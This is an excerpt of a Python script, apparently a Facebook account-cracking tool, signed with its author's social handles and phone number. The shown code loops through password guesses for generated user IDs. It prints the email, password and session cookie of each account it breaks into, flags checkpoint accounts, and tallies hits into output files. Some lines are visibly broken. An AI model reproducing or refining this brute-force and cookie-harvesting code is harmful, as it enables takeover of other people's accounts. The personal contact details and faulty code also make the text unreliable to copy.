...
##     ## ##     ## ########  
\033[1;37;1m-----------------------------------------------
\033[1;37m \033[1;41m AUTHOR :  Azan Ali \033[0m\033[1;37m
\033[1;37;1m  Facebook : AZAN X. 
\033[1;37;1m GITHUB    :  MR-AZAN
\033[1;37;1m  WHATSAPP : +923165456679
\033[1;37;1m  Virson   : 0.1
\033[1;37;1m---------------------------------------------"""  
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mAXB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mAXB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mAXB-2F.txt' %
              (H, P, str(len(twf))))
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            print(f"{GREEN}[AXB]---------------------------------------------------[AXB]")
    #____________#
def xyz():
    #os.system("play-audio WELCOME_TO_AXB_WORLD_818.mp3")
    os.getuid
...
def Random():
    ...
    print(f"")
    linex()
    print(f"\033[1;37m\t  USE OUR COUNTRY CODE  ")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[AXB]---------------------[SUCCESSFUL]--------------------[AXB]\nEMAIL : '+uid+'\nUID   : '+cid+' AXB '+ps+ '\nCOOKIE   : '+coki+'\n[AXB]---------------------------------------------------[AXB]')
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[AXB]--------------------[CHECKPOINT ]---------------------[AXB]\nEMAIL : '+uid+'\nUID   : '+cid+' AXB '+ps+ '\n[AXB]---------------------------------------------------[AXB]\033[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AXB] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
